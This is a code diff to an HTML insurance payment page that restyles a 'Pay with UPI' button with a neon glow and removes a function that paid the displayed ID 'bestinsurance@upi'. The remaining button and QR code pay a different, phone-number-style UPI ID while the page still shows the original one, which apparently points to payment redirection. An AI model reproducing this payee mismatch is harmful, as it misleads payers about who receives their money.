@@ -114,6 +114,26 @@ transform:scale(0.97);
 box-shadow:0 3px 8px rgba(0,0,0,0.3);
 }
 
+/* Neon UPI Button */
+.neonBtn{
+background:#ffd700;
+color:#000;
+border:none;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 0 10px #ffd700, 0 0 20px #ffea00, 0 0 40px #ffea00;
+animation:neonGlow 1.5s infinite alternate;
+}
+
+@keyframes neonGlow{
+from{
+box-shadow:0 0 10px #ffd700, 0 0 20px #ffea00, 0 0 40px #ffea00;
+}
+to{
+box-shadow:0 0 20px #ffff00, 0 0 40px #ffff00, 0 0 60px #ffff00;
+}
+}
+
 img{
 width:200px;
 margin:15px auto;
@@ -122,7 +142,6 @@ display:block;
 
 .hidden{display:none;}
 
-/* Loader */
 .loader{
 position:fixed;
 top:0;
@@ -173,7 +192,7 @@ padding:15px;
 
 <div class="loader" id="loader">
 <div class="spinner"></div>
-<div id="loaderText">Processing...</div>
+<div>Processing...</div>
 </div>
 
 <div class="card">
@@ -189,14 +208,11 @@ padding:15px;
 
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR" alt="UPI QR Code">
 
-
-<button onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
+<button class="neonBtn" onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
 Pay with UPI
 </button>
 
 <p>UPI: bestinsurance@upi </p>
-
-<button class="mainBtn" onclick="openUPI()">Pay with UPI</button>
 
 <input id="mobile" placeholder="Mobile Number">
 <input type="file" id="proof">
@@ -245,10 +261,6 @@ p1.classList.add("hidden");
 p2.classList.remove("hidden");
 }
 
-function openUPI(){
-window.location.href="upi://pay?pa=bestinsurance@upi&pn=Best%20Insurance&am=120.00&cu=INR";
-}
-
 function submitForm(){
 if(mobile.value.length<10){alert("Enter valid mobile");return;}
 if(!proof.files[0]){alert("Upload screenshot");return;}
@@ -265,13 +277,10 @@ method:"POST",
 body:data
 })
 .then(()=>{
-
 document.getElementById("loader").style.display="none";
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
-
 setTimeout(()=>{goHome();},7000);
-
 })
 .catch(()=>{
 document.getElementById("loader").style.display="none";
